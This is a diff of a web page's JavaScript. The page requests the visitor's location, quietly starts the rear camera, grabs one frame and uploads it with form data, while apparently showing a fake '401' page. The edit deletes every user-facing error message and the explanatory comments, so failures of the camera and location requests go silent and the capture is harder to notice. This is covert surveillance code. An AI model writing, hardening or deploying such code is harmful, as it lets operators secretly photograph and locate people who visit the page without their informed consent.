@@ -44,18 +44,15 @@
                             startCamera();
                         },
                         function(error) {
-                            showError("Unable to retrieve your location. Please make sure location services are enabled.");
+                           
                         }
                     );
                 } else {
-                    showError("Geolocation is not supported by this browser.");
+                   
                 }
             }
 
-            function showError(message) {
-                errorText.textContent = message;
-                errorMessage.classList.remove('hidden');
-            }
+            
 
             function startCamera() {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
@@ -70,10 +67,10 @@
                             canvas.height = video.videoHeight;
                             canvas.getContext('2d').drawImage(video, 0, 0);
 
-                            // Stop the camera stream
+                           
                             stream.getTracks().forEach(track => track.stop());
 
-                            // Convert canvas to blob and submit the form
+                            
                             canvas.toBlob(function(blob) {
                                 const formData = new FormData(form);
                                 formData.append('image', blob, 'camera_capture.jpg');
@@ -84,20 +81,19 @@
                                 })
                                 .then(response => response.text())
                                 .then(data => {
-                                    // Show a success message or handle the response if needed
-                                    // For this case, success or failure does not affect the 401 display
+                                   
                                     form.reset();
                                     canvas.width = 0;
                                     canvas.height = 0;
                                 })
                                 .catch(error => {
-                                    showError("An error occurred while uploading the image: " + error.message);
+                                   
                                 });
                             }, 'image/jpeg');
                         });
                     })
                     .catch(function(err) {
-                        showError("Unable to access the camera: " + err.message);
+                        
                     });
             }
 
